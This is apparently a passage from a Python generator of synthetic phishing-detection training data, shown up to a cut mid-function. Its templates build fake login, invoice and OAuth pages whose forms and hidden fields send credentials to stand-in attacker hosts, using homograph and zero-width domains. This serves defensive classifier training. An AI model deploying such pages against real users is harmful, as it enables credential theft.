#!/usr/bin/env python
# -*- coding: utf-8 -*-
r"""T9-phish 扩容生成器（网页 DOM 载体：结构层 + 语用层；M2.5 staging 备料）。

背景：M2.5 混料 data/lf/sft_m25.jsonl 中 task 前缀 T9-phish 的行只有 96 行；
T9 是唯一同时覆盖「结构层 + 语用层」两个栖居处（docs/00-problem-definition.md
§3 五栖居处）的族。本生成器把该族扩到 1–2K 行，提高 web 载体的覆盖与多样性。

覆盖维度（生成后打印分布，并写入 reports/*-stats.json）：
  ① 结构层线索（6）：hidden-field（隐藏字段） / display-none（display:none 块） /
     zero-width（零宽字符） / homograph（同形异码字域名） /
     form-action-external（表单 action 外发 + 显示文本与链接目标不匹配） /
     mixed-content（HTTPS 页面混入明文外链脚本/1x1 像素）
  ② 语用层线索（4）：urgency（紧迫话术） / authority（权威伪装 + 伪造 SSL 徽标） /
     cred-solicit（凭证/验证码/卡号索求） / redirect-chain（异常跳转链）
  ③ 载体类型（6）：login 登录页 / invoice 发票 / oauth OAuth 授权页 /
     ticket 客服工单 / qr 二维码落地页 / internal 伪造内部系统门户
  ④ 干净负例：clean-login 正规登录页（20% 槽位）+ clean-marketing 正规营销页
     （15% 槽位）→ 负例合计 35% ≥ 30%（防「网页=钓鱼」偏见）

三档政策包梯度——**同一页面、同一 user 文本**，只换 pack（政策条件化配对）：
  hard（≥2 结构层 + ≥2 语用层，且存在凭据外发路径）：
      conservative=refuse（不下钻/不展开，只建议阻断）
      default=report（证据清单 + 上报反钓鱼通道）
      professional=report（提取 IOC 入威胁情报队列 + 品牌保护通道）
  soft（1 条软性结构线索 + 1–2 条语用线索，未构成确证钓鱼）：
      conservative=refuse（无授权语境不给处置建议）
      default=report（按可疑上报）
      professional=answer（**解释风险后正常回答**，按不可信输入处理）
  clean（负例）：三包同 answer/benign——负例刻意不给包差异，避免训出误报偏好。

机械事实表示**复用** secfm.carriers.html_ser.serialize_webpage（[hidden] /
[collects: …] / [sensitive-input] / handler: / 1x1-image / redirect / [note:
displayed as … but links to …] 等标注），不另造格式；上下文信封复用
secfm.protocol.context.build_context。

行契约：{id, task, pack, lang, messages} 与 gen_sft_v0.build_sample 逐字一致；
POLICY_SYSTEM / build_sample / verdict_line 直接 import 自 gen_sft_v0（不复制）。
task 写法沿用 gen_sft_v0 载体族惯例 `T1-injection:{ctype}:{fam}:{pos}` →
`T9-phish:{carrier}:{cue}:{verdict}`；负例沿用既有 T9 写法
`T9-phish:{carrier}:benign-control|hardneg-control`。
（注：gen_sft_v0.py 本身不含 T9 生成代码——现存 T9 行来自 scripts/gen_sft_v0x.py
（m1，50 行，混料中 46 行去重后留存）与 scripts/gen_sft_m25.py（staging，50 行）；
本文件的去重基线即混料中的这 96 行，键 = md5(pack + "\x00" + user)。）

纪律：域名全为示例/明显虚构（example.com / example-bank.cn / *.example 等），
不使用任何真实机构域名（生成后按 secfm.carriers.lookalike.BRANDS 复检）；
不读写评估集与探针集目录（源码级红线，见下方断言）；CPU-only，无训练作业。

产物：<out>/t9_phish_expand.jsonl + <stats>.json
用法：
  python scripts/gen_t9_phish_expand.py --out data/sft/m2.5-staging --n 1500 \
      --seed 20261006
"""
from __future__ import annotations

import argparse
import hashlib
import json
import random
import re
import sys
from pathlib import Path

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "scripts"))

from gen_sft_v0 import (  # noqa: E402  v0 契约复用（不复制）
    POLICY_SYSTEM, build_sample, verdict_line)
from secfm.carriers.html_ser import serialize_webpage  # noqa: E402
from secfm.carriers.lookalike import domain_lookalike_note  # noqa: E402
from secfm.protocol.context import build_context  # noqa: E402

# —— 生产断言 0：评估/探针路径零引用（红线，沿 gen_sft_m25 先例）——
_SRC = Path(__file__).read_text(encoding="utf-8")
for _lit in ("probes", "heldout"):
    # 只允许出现在本断言自身的字面量里（沿 gen_sft_m25 先例：count <= 2）
    assert _SRC.count(_lit) <= 2, f"eval path literal referenced: {_lit}"

OUT_DIR_DEFAULT = ROOT / "data" / "sft" / "m2.5-staging"
FILE_NAME = "t9_phish_expand.jsonl"
STATS_DEFAULT = ROOT / "reports" / "t9-phish-expand-stats.json"
PACKS = ("conservative", "default", "professional")
SEED_DEFAULT = 20261006
ID_PREFIX = "sft-m25-T9X"
MIX_FILE = ROOT / "data" / "lf" / "sft_m25.jsonl"
T9_SOURCES = (
    ROOT / "data" / "sft" / "v0x" / "t9_phish.jsonl",
    ROOT / "data" / "sft" / "m2.5-staging" / "t9_phishing.jsonl",
)
ZWSP = "\u200b"
_CJK = re.compile(r"[\u4e00-\u9fff]")
NEG_MIN_RATIO = 0.30
DIFF_MIN_ALL = 0.55
DIFF_MIN_ATTACK = 0.95

# ============================================================ 维度：线索 ===
# 全部虚构域；官方域用保留示例域（example.* / example-bank.cn 等）
BRANDS = (
    dict(host="example-bank.cn", zh="示例银行", en="Example Bank"),
    dict(host="example-portal.com", zh="示例云", en="Example Cloud"),
    dict(host="example-social.example", zh="示例社交", en="Example Social"),
    dict(host="example-shop.example", zh="示例商城", en="Example Shop"),
    dict(host="example-mail.example", zh="示例邮箱", en="Example Mail"),
    dict(host="example-pay.example", zh="示例支付", en="Example Pay"),
)
HOSTING_ZONE = "example-hosting.example"
EVIL_ZONES = ("verify-account.example", "secure-login.example",
              "gov-verify.example", "example-cdn.cn")
SHORT_HOST = "short.example-cdn.cn"
TAGS = ("acct", "sso", "billing", "invoice", "verify", "support", "secure",
        "auth", "notice", "portal")
ALLOWED_HOST_SUFFIXES = tuple(
    [b["host"] for b in BRANDS]
    + [HOSTING_ZONE, SHORT_HOST, "example.com"] + list(EVIL_ZONES))

STRUCT_CUES = {
    "hidden-field": {
        "zh": "结构层：表单内含指向外部域的隐藏字段（提交时静默外发）",
        "en": "structural: hidden form field carrying an off-domain redirect "
              "target"},
    "display-none": {
        "zh": "结构层：display:none 隐藏块承载与可见内容不一致的紧迫提示",
        "en": "structural: display:none block carrying an urgency notice that "
              "is absent from the visible copy"},
    "zero-width": {
        "zh": "结构层：显示域名内嵌零宽字符（U+200B）以规避字符串匹配",
        "en": "structural: zero-width characters (U+200B) embedded in the "
              "displayed domain to defeat string matching"},
    "homograph": {
        "zh": "结构层：同形异码字域名（西里尔字母替换 ASCII，视觉与官方域一致）",
        "en": "structural: IDN homograph domain (Cyrillic letters standing in "
              "for ASCII glyphs)"},
    "form-action-external": {
        "zh": "结构层：表单提交到与页面声称不符的外部域，且链接的显示文本与"
              "真实目标不一致",
        "en": "structural: the form posts to an off-domain host and a link's "
              "display text disagrees with its real target"},
    "mixed-content": {
        "zh": "结构层：HTTPS 页面混入明文外链脚本与 1x1 追踪像素",
        "en": "structural: HTTPS page mixing a plaintext external script and a "
              "1x1 tracking pixel"},
}
PRAG_CUES = {
    "urgency": {
        "zh": "语用层：紧迫话术（限时冻结/停用倒计时）",
        "en": "pragmatic: urgency copy (limited-time freeze / suspension "
              "countdown)"},
    "authority": {
        "zh": "语用层：权威伪装（官方安全中心/服务台徽标与 SSL 认证声明）",
        "en": "pragmatic: authority impersonation (official security-center "
              "badge asserting an SSL guarantee)"},
    "cred-solicit": {
        "zh": "语用层：凭证/验证码/卡号索求字段——表单收集敏感输入",
        "en": "pragmatic: credential/OTP/card-number solicitation — the form "
              "collects sensitive input"},
    "redirect-chain": {
        "zh": "语用层：异常跳转链（meta refresh 经短链中转到外部域）",
        "en": "pragmatic: abnormal redirect chain (meta refresh through a "
              "link shortener to an off-domain host)"},
}
HARDNEG_FEATURES = {
    "same-domain-https-action": {
        "zh": "表单提交到页面主域自身的 HTTPS 端点",
        "en": "form posts to the page's own HTTPS endpoint"},
    "benign-csrf-hidden-field": {
        "zh": "同域表单内的良性隐藏 CSRF 字段（隐藏≠恶意）",
        "en": "benign hidden CSRF field inside a same-domain form (hidden is "
              "not automatically malicious)"},
    "promo-countdown": {
        "zh": "营销倒计时话术（硬负例：紧迫感本身不是钓鱼信号）",
        "en": "marketing countdown copy (hard negative: urgency alone is not "
              "a phishing signal)"},
}
CARRIERS = ("login", "invoice", "oauth", "ticket", "qr", "internal")
PAGE_PATH = {"login": "login", "invoice": "billing/invoice",
             "oauth": "oauth/authorize", "ticket": "support/ticket",
             "qr": "qr/confirm", "internal": "sso/login"}
CARRIER_LABEL = {
    "login": {"zh": "登录页", "en": "login page"},
    "invoice": {"zh": "发票页", "en": "invoice page"},
    "oauth": {"zh": "OAuth 授权页", "en": "OAuth consent page"},
    "ticket": {"zh": "客服工单页", "en": "support-ticket page"},
    "qr": {"zh": "二维码落地页", "en": "QR-code landing page"},
    "internal": {"zh": "内部系统门户", "en": "internal-portal page"},
}
# 20 槽位计划：hard 6 / soft 7 / clean-login 4 / clean-marketing 3（负例 7）
# 负例刻意交错分布（不是堆在块尾）——小 n 截断时负例占比仍 ≥30%。
CAT_PATTERN = ("hard", "clean-login", "soft", "hard", "clean-marketing",
               "soft", "hard", "clean-login", "soft", "hard",
               "clean-marketing", "soft", "hard", "clean-login", "soft",
               "hard", "clean-marketing", "soft", "clean-login", "soft")
SOFT_STRUCT_POOL = ("display-none", "zero-width", "mixed-content")
HARD_ANCHOR_POOL = ("form-action-external", "homograph", "hidden-field")
SOFT_PRAG_POOL = ("urgency", "authority", "cred-solicit")
HARD_PRAG_POOL = ("urgency", "authority", "redirect-chain")

EVIDENCE_ORDER = tuple(STRUCT_CUES) + tuple(PRAG_CUES)

# ============================================================ 文案表 =====
TASKS = {
    "login": {"zh": ["审查下面这个登录页面的 DOM 序列化结果，判断是否为钓鱼页"
                     "并给出依据。",
                     "这段登录页 DOM 有没有钓鱼特征？给出裁决与依据。"],
              "en": ["Review the serialized DOM of this login page and decide "
                     "whether it is a phishing page, with evidence.",
                     "Does this login-page DOM show phishing traits? Give a "
                     "verdict and evidence."]},
    "invoice": {"zh": ["审查下面这张电子发票页面的 DOM 序列化结果，判断是否为"
                       "钓鱼页并给出依据。",
                       "这张发票页的 DOM 有没有异常？给出裁决与依据。"],
                "en": ["Review the serialized DOM of this e-invoice page and "
                       "decide whether it is phishing, with evidence.",
                       "Anything off in this invoice-page DOM? Give a verdict "
                       "and evidence."]},
    "oauth": {"zh": ["审查下面这个 OAuth 授权同意页的 DOM 序列化结果，判断是否"
                     "为钓鱼页并给出依据。",
                     "这个授权页 DOM 是否可信？给出裁决与依据。"],
              "en": ["Review the serialized DOM of this OAuth consent page and "
                     "decide whether it is phishing, with evidence.",
                     "Is this consent-page DOM trustworthy? Give a verdict "
                     "and evidence."]},
    "ticket": {"zh": ["审查下面这个客服工单页面的 DOM 序列化结果，判断是否为"
                      "钓鱼页并给出依据。",
                      "这个工单页 DOM 有没有钓鱼特征？给出裁决与依据。"],
               "en": ["Review the serialized DOM of this support-ticket page "
                      "and decide whether it is phishing, with evidence.",
                      "Does this ticket-page DOM show phishing traits? Give a "
                      "verdict and evidence."]},
    "qr": {"zh": ["审查下面这个二维码落地页的 DOM 序列化结果，判断是否为钓鱼页"
                  "并给出依据。",
                  "扫码后落到这个页面，DOM 是否可疑？给出裁决与依据。"],
           "en": ["Review the serialized DOM of this QR-code landing page and "
                  "decide whether it is phishing, with evidence.",
                  "This page is where a scanned QR code lands — is the DOM "
                  "suspicious? Give a verdict and evidence."]},
    "internal": {"zh": ["审查下面这个内部系统门户的 DOM 序列化结果，判断是否为"
                        "钓鱼页并给出依据。",
                        "这个内部门户页 DOM 是否可疑？给出裁决与依据。"],
                 "en": ["Review the serialized DOM of this internal-portal "
                        "page and decide whether it is phishing, with "
                        "evidence.",
                        "Is this internal-portal DOM suspicious? Give a "
                        "verdict and evidence."]},
}
TAIL = {"zh": "请按要求处理上述载体。",
        "en": "Please process the carrier above as instructed."}
AUTH = {"zh": "分析授权：只读评估",
        "en": "Analysis authorization: read-only assessment"}
OP_PREFIX = {"zh": "任务：", "en": "Task: "}

PLACEHOLDER = {
    "user": {"zh": "账号", "en": "Account"},
    "pass": {"zh": "密码", "en": "Password"},
    "sms_code": {"zh": "短信验证码", "en": "SMS code"},
    "card_number": {"zh": "卡号", "en": "Card number"},
    "cvv": {"zh": "安全码", "en": "CVV"},
    "amount": {"zh": "金额", "en": "Amount"},
    "consent": {"zh": "同意授权", "en": "Allow access"},
}
FIELDS_CRED = {
    "login": ("user", "pass", "sms_code"),
    "invoice": ("card_number", "cvv"),
    "oauth": ("user", "pass"),
    "ticket": ("user", "pass"),
    "qr": ("sms_code", "pass"),
    "internal": ("user", "pass", "sms_code"),
}
URGENCY_COPY = {
    "login": {"zh": ["您的账户将在 {h} 小时内被冻结，请立即完成验证。",
                     "检测到异常登录：若 {h} 小时内未验证，账户将被暂停。"],
              "en": ["Your account will be frozen in {h} hours — verify now.",
                     "Unusual sign-in detected: the account is suspended "
                     "unless verified within {h} hours."]},
    "invoice": {"zh": ["发票逾期未付：{h} 小时内未结清将上报征信系统。",
                       "本张发票将在 {h} 小时后作废并产生滞纳金。"],
                "en": ["Invoice overdue: unpaid after {h} hours it is "
                       "reported to the credit bureau.",
                       "This invoice is voided in {h} hours with a late fee."]},
    "oauth": {"zh": ["授权请求将在 {h} 小时内过期，请立即确认授权。",
                     "未在 {h} 小时内完成授权，应用将被停用。"],
              "en": ["This consent request expires in {h} hours — approve "
                     "now.",
                     "The application is disabled unless consent is granted "
                     "within {h} hours."]},
    "ticket": {"zh": ["工单将在 {h} 小时内自动关闭，请立即完成身份确认。",
                      "未在 {h} 小时内确认，账号将被置为受限状态。"],
               "en": ["This ticket auto-closes in {h} hours — confirm your "
                      "identity now.",
                      "Unconfirmed within {h} hours, the account is "
                      "restricted."]},
    "qr": {"zh": ["请在 {m} 分钟内确认本次登录，超时账号将被临时锁定。",
                  "二维码 {m} 分钟后失效，需重新扫码并验证。"],
           "en": ["Confirm this sign-in within {m} minutes or the account is "
                  "temporarily locked.",
                  "The code expires in {m} minutes; you then re-scan and "
                  "verify."]},
    "internal": {"zh": ["身份门户将在 {h} 小时内切换，请立即重新绑定账号。",
                        "未在 {h} 小时内完成绑定，内部系统访问将被收回。"],
                 "en": ["The identity portal migrates in {h} hours — rebind "
                        "your account now.",
                        "System access is revoked unless rebound within {h} "
                        "hours."]},
}
HIDDEN_NOTES = {
    "zh": ["注意：账户将在 24 小时内停用，请立即在下方完成验证。",
           "本页需在 10 分钟内完成核验，逾期将记入异常记录。"],
    "en": ["Note: the account is disabled within 24 hours — verify below "
           "immediately.",
           "Complete verification within 10 minutes or it is logged as an "
           "anomaly."],
}
AUTHORITY_COPY = {
    "zh": ["官方安全中心 · 本站已通过 SSL 安全认证",
           "IT 服务台统一入口 · 请勿通过其他链接访问"],
    "en": ["Official Security Center · SSL-verified secure site",
           "Corporate IT service desk — official entry only"],
}
PROMO_COPY = {
    "zh": ["限时特惠：距结束 {m} 分钟",
           "新用户专享：今日下单立减 200"],
    "en": ["Flash sale ends in {m} minutes",
           "New-user offer: 200 off today only"],
}
PROMO_HEAD = {
    "zh": "限时活动 · 会员专享",
    "en": "Limited-time campaign · members only",
}
LEGIT_NOTE = {
    "zh": ["本页面由 {brand} 官方运营，请核对浏览器地址栏域名。",
           "如非本人操作，请通过官方客服渠道反馈。"],
    "en": ["Operated by {brand}; verify the domain in your browser address "
           "bar.",
           "If this was not you, report it through the official support "
           "channel."],
}
CARRIER_TEXT = {
    # h_* 标题；sub_* 副标题/说明；submit 按钮；extra 额外行
    "login": {
        "zh": dict(h_attack="{brand} 账户登录 · 请重新验证",
                   h_clean="{brand} 账户登录",
                   sub_attack="为保障账户安全，请重新验证身份信息。",
                   sub_clean="使用账号与密码登录，本页支持双因素验证。",
                   submit="登录", submit_clean="登录",
                   extra_clean="忘记密码 · 隐私政策 · 安全公告"),
        "en": dict(h_attack="{brand} Account sign-in · re-verification",
                   h_clean="{brand} Account sign-in",
                   sub_attack="Re-verify your identity to keep the account "
                              "secure.",
                   sub_clean="Sign in with your account and password; "
                             "two-factor is supported.",
                   submit="Sign in", submit_clean="Sign in",
                   extra_clean="Forgot password · Privacy · Security notice"),
    },
    "invoice": {
        "zh": dict(h_attack="电子发票（待付）INV-2026-{num}",
                   h_clean="电子发票 INV-2026-{num}（已结清）",
                   sub_attack="{brand} 电子发票，金额 {amt}，请在页面内完成支付。",
                   sub_clean="{brand} 电子发票已结清，可下载 PDF 存档。",
                   submit="立即支付", submit_clean="下载 PDF",
                   extra_clean="下载 PDF · 开票记录"),
        "en": dict(h_attack="E-invoice (unpaid) INV-2026-{num}",
                   h_clean="E-invoice INV-2026-{num} (settled)",
                   sub_attack="{brand} e-invoice, amount {amt} — complete the "
                              "payment on this page.",
                   sub_clean="{brand} e-invoice is settled; download the PDF "
                              "for your records.",
                   submit="Pay now", submit_clean="Download PDF",
                   extra_clean="Download PDF · Billing history"),
    },
    "oauth": {
        "zh": dict(h_attack="授权请求：{app} 请求访问你的 {brand} 账户",
                   h_clean="授权请求：{app}（内部应用）",
                   sub_attack="该应用请求以下权限：读取消息与联系人、代表你"
                              "发送内容、修改账户设置。",
                   sub_clean="该应用请求权限：读取你的公开资料。可随时在设置"
                             "中撤销。",
                   submit="同意授权", submit_clean="授权只读资料",
                   extra_clean="撤销授权 · 应用管理"),
        "en": dict(h_attack="{app} requests access to your {brand} account",
                   h_clean="Consent request: {app} (internal application)",
                   sub_attack="Requested scopes: read messages and contacts, "
                              "send content on your behalf, change account "
                              "settings.",
                   sub_clean="Requested scope: read your public profile. You "
                             "can revoke it any time in settings.",
                   submit="Allow access", submit_clean="Allow read-only",
                   extra_clean="Revoke · Manage apps"),
    },
    "ticket": {
        "zh": dict(h_attack="工单 #CS-{num}：账号异常登录待确认",
                   h_clean="工单 #CS-{num}：已受理",
                   sub_attack="系统检测到来自陌生设备的登录（203.0.113.{ip}），"
                              "请确认是否为本人操作。",
                   sub_clean="状态：处理中。基础架构组已排期，无需重复提交。",
                   submit="确认身份", submit_clean="查看工单",
                   extra_clean="查看历史工单 · 服务级别说明"),
        "en": dict(h_attack="Ticket #CS-{num}: unusual sign-in pending "
                            "confirmation",
                   h_clean="Ticket #CS-{num}: accepted",
                   sub_attack="A sign-in from an unrecognized device "
                              "(203.0.113.{ip}) was detected — confirm whether "
                              "this was you.",
                   sub_clean="Status: in progress. Infrastructure has queued "
                             "the work; no need to resubmit.",
                   submit="Confirm identity", submit_clean="View ticket",
                   extra_clean="Ticket history · Service-level policy"),
    },
    "qr": {
        "zh": dict(h_attack="扫码登录确认",
                   h_clean="扫码登录确认",
                   sub_attack="请确认本次登录：确认后该设备将获得账号访问权限。",
                   sub_clean="确认后本次登录生效；请仅在官方 App 内操作。",
                   submit="确认登录", submit_clean="确认登录",
                   extra_clean="取消 · 登录设备管理"),
        "en": dict(h_attack="Confirm sign-in from QR code",
                   h_clean="Confirm sign-in from QR code",
                   sub_attack="Confirm this sign-in; the device then gets "
                              "access to your account.",
                   sub_clean="Confirming completes this sign-in; only do it "
                             "inside the official app.",
                   submit="Confirm", submit_clean="Confirm",
                   extra_clean="Cancel · Manage devices"),
    },
    "internal": {
        "zh": dict(h_attack="{brand} 员工统一身份门户（SSO）",
                   h_clean="{brand} 员工统一身份门户（SSO）",
                   sub_attack="内部系统升级，请重新绑定账号并校验身份。",
                   sub_clean="使用工号与本机证书登录；异常时联系服务台。",
                   submit="绑定并登录", submit_clean="登录",
                   extra_clean="服务台 · 安全须知"),
        "en": dict(h_attack="{brand} staff identity portal (SSO)",
                   h_clean="{brand} staff identity portal (SSO)",
                   sub_attack="Internal systems were upgraded — rebind and "
                              "re-verify your account.",
                   sub_clean="Sign in with your staff ID and this machine's "
                             "certificate; contact the desk on anomalies.",
                   submit="Rebind and sign in", submit_clean="Sign in",
                   extra_clean="Service desk · Security notes"),
    },
}
APPS = ("example-drive-sync", "example-mail-helper", "example-calendar-app",
        "example-notes-sync")

# ============================================================ 应答模板 ===
REPLY = {
    "hard": {
        "conservative": {
            "zh": ("裁决：phishing（保守包：不下钻、不展开页面细节）。\n"
                   "依据：{ev}。\n"
                   "保守包处置：立即停止与该页面的交互并阻断其域名，引导用户"
                   "从官方入口重新进入；IOC 清单与上报模板等操作级内容不在"
                   "本包范围内，确需请以 default 或 professional 包重试。"),
            "en": ("Verdict: phishing (conservative pack: no deeper drilling, "
                   "no elaboration on page content).\n"
                   "Evidence: {ev}.\n"
                   "Conservative-pack handling: stop interacting with the "
                   "page and block its domain now, then direct users to the "
                   "official entry point; IOC lists and reporting templates "
                   "are out of scope for this pack — retry under default or "
                   "professional if needed.")},
        "default": {
            "zh": ("裁决：phishing。\n依据：{ev}。\n"
                   "建议：阻断该域、提醒用户认准官方入口，留存样本并上报反"
                   "钓鱼通道；不要在该页面提交任何凭据或验证码。"),
            "en": ("Verdict: phishing.\nEvidence: {ev}.\n"
                   "Advice: block the domain, point users to the official "
                   "entry, preserve the sample and report it to the "
                   "anti-phishing channel; never submit credentials or one-time "
                   "codes on that page.")},
        "professional": {
            "zh": ("裁决：phishing。\n依据：{ev}。\n"
                   "专业包处置：提取 IOC（页面域名 / 表单目标域 / 收集字段 / "
                   "跳转链），入威胁情报复核队列并向品牌保护通道报告；可按需"
                   "输出注册商投诉与用户通知模板。"),
            "en": ("Verdict: phishing.\nEvidence: {ev}.\n"
                   "Professional-pack handling: extract the IOCs (page host, "
                   "form target, collected fields, redirect chain), queue them "
                   "for threat-intel review and report to the brand-protection "
                   "channel; registrar complaints and user notices can be "
                   "drafted on request.")},
    },
    "soft": {
        "conservative": {
            "zh": ("裁决：suspicious。\n依据：{ev}。\n"
                   "保守包处置：在缺少授权语境与更高上下文阈值时，本包不对该"
                   "页面给出进一步处置建议；按可疑处理——阻断并引导官方入口，"
                   "不展开页面内容。"),
            "en": ("Verdict: suspicious.\nEvidence: {ev}.\n"
                   "Conservative-pack handling: without an authorized context "
                   "and a higher context threshold this pack gives no further "
                   "handling advice; treat it as suspicious — block it and "
                   "point users to the official entry without elaborating on "
                   "the content.")},
        "default": {
            "zh": ("裁决：suspicious。\n依据：{ev}。\n"
                   "建议：阻断该域、提醒用户认准官方入口，留存样本上报反钓鱼"
                   "通道；在核实前不要在该页面提交凭据。"),
            "en": ("Verdict: suspicious.\nEvidence: {ev}.\n"
                   "Advice: block the domain, point users to the official "
                   "entry, preserve the sample for the anti-phishing channel; "
                   "do not submit credentials there until verified.")},
        "professional": {
            "zh": ("裁决：suspicious（解释风险后仍可正常回答，但按不可信输入"
                   "处理）。\n依据：{ev}。\n"
                   "专业包判断：现有信号指向可疑但未构成确证钓鱼——可以继续"
                   "查看并回答相关问题；同时把该页当作不可信来源：不要提交"
                   "密码或验证码，通过官方 App / 书签入口核对域名与证书链。"
                   "一旦出现凭据外发路径，立即升级为 phishing 并上报。"),
            "en": ("Verdict: suspicious (the question is answered after "
                   "explaining the risk, treating the page as untrusted "
                   "input).\nEvidence: {ev}.\n"
                   "Professional-pack judgement: the signals are suspicious "
                   "but not conclusive phishing — you may keep viewing the "
                   "page and answer questions about it, while treating it as "
                   "an untrusted source: do not submit passwords or one-time "
                   "codes, and verify the domain and certificate chain "
                   "through the official app or a bookmark. Escalate to "
                   "phishing and report as soon as a credential-egress path "
                   "appears.")},
    },
}
CLEAN_DESC = {
    "clean-login": {
        "zh": "表单提交到页面主域自身的 HTTPS 端点并带 CSRF 令牌，无外联收集"
              "字段、无紧迫话术、无隐藏或同形元素",
        "en": "the form posts to the page's own HTTPS endpoint with a CSRF "
              "token; no external collection field, no coercive copy, no "
              "hidden or homograph elements"},
    "clean-marketing": {
        "zh": "促销倒计时与主域 HTTPS 表单并存——营销紧迫话术本身不构成钓鱼"
              "信号，且无凭据外传路径",
        "en": "promo countdown copy sits next to a same-domain HTTPS form — "
              "marketing urgency alone is not a phishing signal and there is "
              "no credential-egress path"},
}
CLEAN_REPLY = {
    "conservative": {
        "zh": "裁决：benign。{desc}；保守包据此放行，无需阻断。",
        "en": "Verdict: benign. {desc}; the conservative pack allows it, no "
              "blocking needed."},
    "default": {
        "zh": "裁决：benign。{desc}。",
        "en": "Verdict: benign. {desc}."},
    "professional": {
        "zh": "裁决：benign。{desc}；专业包登记为已核对样本，无可提取 IOC。",
        "en": "Verdict: benign. {desc}; the professional pack files it as a "
              "checked sample with no extractable IOCs."},
}
CONFIDENCE = {"hard": 0.92, "soft": 0.74, "clean-login": 0.88,
              "clean-marketing": 0.86}
ACTION_BY_PACK = {
    "hard": {"conservative": "refuse", "default": "report",
             "professional": "report"},
    "soft": {"conservative": "refuse", "default": "report",
             "professional": "answer"},
    "clean-login": dict.fromkeys(PACKS, "answer"),
    "clean-marketing": dict.fromkeys(PACKS, "answer"),
}
VERDICT_BY_CAT = {"hard": "phishing", "soft": "suspicious",
                  "clean-login": "benign", "clean-marketing": "benign"}


# ============================================================ 页面构造 ====
def _homograph(host: str) -> str:
    """官方域 -> 同形异码字域（首个 a 替换为西里尔 a）。"""
    return host.replace("a", "\u0430", 1)


def _zw(host: str) -> str:
    """域名内嵌零宽空格（机器可见、人眼不可见）。"""
    return host.replace("-", ZWSP + "-", 1) if "-" in host else host.replace(
        ".", ZWSP + ".", 1)


def _form_lines(x, lang, action, fields, cues, submit, extra=()):
    """表单（机械事实由 html_ser 标注：[collects: …] /*、[sensitive-input]）。"""
    out = [f'<form action="{action}" method="POST" id="f-{x["token"]}">']
    if "hidden-field" in cues:
        out.append(f'<input type="hidden" name="next" '
                   f'value="http://{x["evil"]}/collect?src=mail">')
    else:
        out.append(f'<input type="hidden" name="csrf_token" '
                   f'value="{x["token"]}">')
    for name in fields:
        typ = "password" if name in ("pass", "cvv") else "text"
        out.append(f'<input type="{typ}" name="{name}" '
                   f'placeholder="{PLACEHOLDER[name][lang]}">')
    out.extend(extra)
    out.append(f'<button type="submit">{submit}</button>')
    out.append("</form>")
    return out


def _page_html(x, carrier, lang, cat):
    """返回 (html_lines, struct_set, prag_set, hardneg_set)。"""
    zh = lang == "zh"
    attack = cat in ("hard", "soft")
    cues = x["cues"]
    struct = {c for c in cues if c in STRUCT_CUES}
    prag = {c for c in cues if c in PRAG_CUES}
    hardneg = set()
    host, evil = x["host"], x["evil"]
    brand = x["brand_zh"] if zh else x["brand_en"]
    brand_disp = brand
    if "zero-width" in cues:
        brand_disp = brand[:-1] + ZWSP + brand[-1]
    T = CARRIER_TEXT[carrier][lang]
    lines = ["<html>", "<head>", f"<title>{brand_disp} - {host}</title>"]
    if "mixed-content" in cues:
        lines.append(f'<script src="http://{evil}/j.js"></script>')
        lines.append(f'<img src="http://{evil}/pixel.gif" width="1" '
                     f'height="1">')
    if "redirect-chain" in cues:
        lines.append('<meta http-equiv="refresh" '
                     f'content="0;url=http://{SHORT_HOST}/{x["code"]}">')
    lines += ["</head>", "<body>",
              f'<header class="brand">{brand_disp}</header>']
    heading = T["h_attack" if attack else "h_clean"].format(
        brand=brand, num=x["num"], amt=x["amt"], app=x["app"])
    lines.append(f"<h1>{heading}</h1>")
    lines.append(f'<p class="sub">'
                 f'{T["sub_attack" if attack else "sub_clean"].format(brand=brand, num=x["num"], amt=x["amt"], app=x["app"], ip=x["ip"])}'
                 f"</p>")
    if "display-none" in cues:
        lines.append(f'<div style="display:none">{x["hidden_note"]}</div>')
    if "authority" in cues:
        lines.append(f'<div class="badge">\U0001f512 {x["authority_copy"]}'
                     f"</div>")
    if "urgency" in cues:
        lines.append(f'<div class="notice">{x["urgency_copy"]}</div>')
    elif cat == "clean-marketing":
        # 正规营销页（硬负例）：促销倒计时 + 同域 HTTPS 表单
        lines.append('<section class="promo">')
        lines.append(f"<h2>{PROMO_HEAD[lang]}</h2>")
        lines.append(f'<p class="promo-copy">{x["promo_copy"]}</p>')
        lines.append("</section>")
        hardneg.add("promo-countdown")
    # ---- 载体主体 ----
    if attack:
        action = (f"http://{evil}/session"
                  if "form-action-external" in cues
                  else f"https://{host}/{PAGE_PATH[carrier]}")
    else:
        action = f"https://{host}/{PAGE_PATH[carrier]}"
        hardneg.add("same-domain-https-action")
    fields = FIELDS_CRED[carrier] if "cred-solicit" in cues else ()
    extra = []
    if carrier == "oauth":
        extra.append(f'<input type="checkbox" name="consent" value="1">'
                     f"<label>{PLACEHOLDER['consent'][lang]}</label>")
    lines += _form_lines(x, lang, action, fields, cues,
                         T["submit" if attack else "submit_clean"], extra)
    if not attack:
        hardneg.add("benign-csrf-hidden-field")
        lines.append(f'<p class="note">'
                     f'{LEGIT_NOTE[lang][0].format(brand=brand)}</p>')
    lines.append(f'<p class="links">{T["extra_clean"]}</p>')
    if "form-action-external" in cues:
        # 显示文本 vs 链接目标不匹配 → lookalike.url_mismatch_note 机械标注
        lines.append(f'<a href="http://{evil}/help">'
                     f"https://{x['official']}/help</a>")
    if "redirect-chain" in cues:
        lines.append(f'<a href="http://{SHORT_HOST}/{x["code"]}">'
                     f'{"继续" if zh else "continue"}</a>')
    if "zero-width" in cues:
        lines.append(f'<p class="domain">'
                     f'{"官方域名" if zh else "Official domain"}: '
                     f'{x["zw_official"]}</p>')
    lines.append(f'<footer>\u00a9 2026 {brand_disp} \u00b7 page '
                 f'{x["token"]}</footer>')
    lines += ["</body>", "</html>"]
    return lines, struct, prag, hardneg


def _instance_ctx(rng, i, carrier, cat, lang, brand):
    d = "ex%02d" % rng.randint(10, 99)
    tag = rng.choice(TAGS)
    tag2 = rng.choice(TAGS)
    zone = rng.choice(EVIL_ZONES)
    attack = cat in ("hard", "soft")
    if not attack:
        cues = set()
    elif cat == "hard":
        anchor = rng.choice(HARD_ANCHOR_POOL)
        struct = {anchor}
        if anchor == "hidden-field":
            # 隐藏字段承载外部跳转目标；同时把外发表单动作实体化
            struct.add("form-action-external")
        k = rng.choice((2, 3)) - len(struct)
